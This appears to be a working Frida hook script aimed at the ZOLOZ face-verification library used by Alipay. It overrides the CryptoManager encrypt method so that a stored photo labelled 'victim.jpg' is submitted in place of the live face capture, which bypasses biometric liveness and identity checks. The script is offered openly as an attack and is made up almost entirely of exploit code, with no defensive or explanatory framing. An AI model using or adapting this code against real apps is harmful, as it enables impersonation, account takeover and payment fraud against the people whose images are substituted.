Java.perform(function () {
   
	console.log("[!] face detect attack")
 	var pic = "sdcard/Download/victim.jpg"

    var File = Java.use('java.io.File')
    var FileInputStream = Java.use('java.io.FileInputStream')
    
    var readBytes = function(path){
        var file = File.$new(path)
        if(!file.exists()){
            console.log("file is missing!")
            return undefined
        }
        var fIn = FileInputStream.$new(file)
        var len = fIn.available()

        var array = new Array(len).fill(0)
        var b = Java.array('byte', array)

        fIn.read(b)
        fIn.close()

        return b
    }

    Java.use("com.alipay.zoloz.toyger.blob.CryptoManager").encrypt.implementation = function(args){
    	var _bytes = readBytes(pic)
        var result = this.encrypt(_bytes);
        return result;
        
    }


});